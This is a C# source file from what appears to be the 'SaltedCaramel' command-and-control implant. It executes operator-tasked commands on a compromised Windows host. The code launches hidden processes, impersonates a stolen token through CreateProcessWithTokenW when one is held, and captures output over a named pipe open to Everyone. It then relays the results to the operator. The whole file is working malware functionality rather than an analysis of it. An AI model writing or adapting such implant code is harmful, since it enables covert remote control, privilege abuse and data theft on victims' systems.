using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;

namespace SaltedCaramel
{
    internal class Proc
    {
        // If we have a stolen token, we need to start a process with CreateProcessWithTokenW
        // Otherwise, we can use Process.Start
        internal static void Execute(SCTask task, SCImplant implant)
        {
            if (implant.hasAlternateToken() == true)
                StartProcessWithToken(task, implant, Token.stolenHandle);
            else
               StartProcess(task, implant);
        }

        internal static void StartProcessWithToken(SCTask task, SCImplant implant, IntPtr TokenHandle)
        {
            string[] split = task.@params.Trim().Split(' ');
            string argString = string.Join(" ", split.Skip(1).ToArray());
            string file = split[0];
            // Create PROCESS_INFORMATION struct to hold info about the process we're going to start
            Win32.PROCESS_INFORMATION newProc = new Win32.PROCESS_INFORMATION();
            // STARTUPINFO is used to control a few startup options for our new process
            Win32.STARTUPINFO startupInfo = new Win32.STARTUPINFO();
            // Use C:\Temp as directory to ensure that we have rights to start our new process
            // TODO: determine if this is safe to change
            string directory = "C:\\Temp";

            // Use random name for our named pipe (used to retrieve output from process)
            byte[] random = new byte[2];
            Random rnd = new Random();
            rnd.NextBytes(random);
            string pipeName = "Caramel_" + BitConverter.ToString(random);

            // Set ACL on named pipe to allow any user to access
            PipeSecurity sec = new PipeSecurity();
            sec.SetAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));

            // Create named pipe server and client
            // We need to use nanmed pipes to communicate with processes started using the Win32 API
            NamedPipeServerStream pipeServer = new NamedPipeServerStream(pipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances,
                PipeTransmissionMode.Message, PipeOptions.None, 1024, 1024, sec);
            NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", pipeName, PipeDirection.InOut, PipeOptions.None);

            try
            {
                pipeClient.Connect();
                pipeServer.WaitForConnection();

                if (pipeClient.IsConnected)
                {
                    // Set process to use named pipe for input/output
                    startupInfo.hStdInput = pipeClient.SafePipeHandle.DangerousGetHandle();
                    startupInfo.hStdOutput = pipeClient.SafePipeHandle.DangerousGetHandle();
                    // STARTF_USESTDHANDLES ensures that the process will respect hStdInput/hStdOutput
                    // STARTF_USESHOWWINDOW ensures that the process will respect wShowWindow
                    startupInfo.dwFlags = (uint)Win32.STARTF.STARTF_USESTDHANDLES | (uint)Win32.STARTF.STARTF_USESHOWWINDOW;
                    startupInfo.wShowWindow = 0;
                }
                else
                {
                    Debug.WriteLine("[!] DispatchTask -> StartProcessWithToken - ERROR connecting to named pipe");
                    throw new Exception("Error connecting to named pipe server.");
                }

                // We're using lpCommandLine to start our new process because I had issues using both lpApplicationName and lpCommandLine
                string cmdLine;
                if (argString != "")
                    cmdLine = "\"" + file + "\" \"" + argString + "\"";
                else
                    cmdLine = "\"" + file + "\"";
                // Finally, create our new process
                bool createProcess = Win32.CreateProcessWithTokenW(TokenHandle, IntPtr.Zero, null, cmdLine, IntPtr.Zero, IntPtr.Zero, directory, ref startupInfo, out newProc);
                if (createProcess) // Process started successfully
                {
                    Debug.WriteLine("[-] DispatchTask -> StartProcessWithToken - Created process with PID " + newProc.dwProcessId);
                    SCTaskResp procStatus = new SCTaskResp(task.id, "Created process with PID " + newProc.dwProcessId);
                    implant.PostResponse(procStatus);
                    Process proc = Process.GetProcessById(newProc.dwProcessId); // We can use Process.HasExited() with this object

                    // Trying to continuously read output while the process is running.
                    using (StreamReader reader = new StreamReader(pipeServer))
                    {
                        string message;
                        while (!proc.HasExited)
                        {
                            message = reader.ReadLine();
                            if (message != "")
                            {
                                SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(message));
                                implant.PostResponse(response);
                            }
                        }

                        pipeClient.Close();
                        pipeClient.Dispose();

                        message = reader.ReadToEnd(); // Ensure we get any output that we missed when loop ended
                        if (message != "")
                        {
                            SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(message));
                            implant.PostResponse(response);
                        }
                    }

                    pipeServer.Close();
                    pipeServer.Dispose();
                    implant.SendComplete(task.id);
                }
                else // TODO: Throw exception on error
                {
                    string errorMessage = Marshal.GetLastWin32Error().ToString();
                    Debug.WriteLine("[!] DispatchTask -> StartProcessWithToken - ERROR starting process: " + errorMessage);
                    pipeClient.Close();
                    pipeServer.Close();
                    implant.SendError(task.id, "Error starting process: " + errorMessage);
                }
            }
            catch (Exception e)
            {
                pipeClient.Close();
                pipeServer.Close();
                implant.SendError(task.id, "Error: " + e.Message);
            }
        }

        internal static void StartProcess (SCTask task, SCImplant implant)
        {
            string[] split = task.@params.Trim().Split(' ');
            string argString = string.Join(" ", split.Skip(1).ToArray());
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = split[0];
            startInfo.Arguments = argString;
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardOutput = true; // Ensure we get standard output
            startInfo.CreateNoWindow = true; // Don't create a new window

            Process proc = new Process();
            proc.StartInfo = startInfo;

            string procOutput = "";
            try
            {
                Debug.WriteLine("[-] DispatchTask -> StartProcess - Tasked to start process " + startInfo.FileName);
                proc.Start();

                while (!proc.StandardOutput.EndOfStream)
                {
                    string line = proc.StandardOutput.ReadLine();
                    procOutput += line + "\n";
                }

                // Strip unnecessary newline
                // TODO: fix the need for this
                procOutput = procOutput.TrimEnd();
                proc.WaitForExit();
                SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(procOutput));
                implant.PostResponse(response);
                implant.SendComplete(task.id);
            }
            catch (Exception e)
            {
                Debug.WriteLine("[!] DispatchTask -> StartProcess - ERROR starting process: " + e.Message);
                implant.SendError(task.id, e.Message);
            }
        }
    }
}
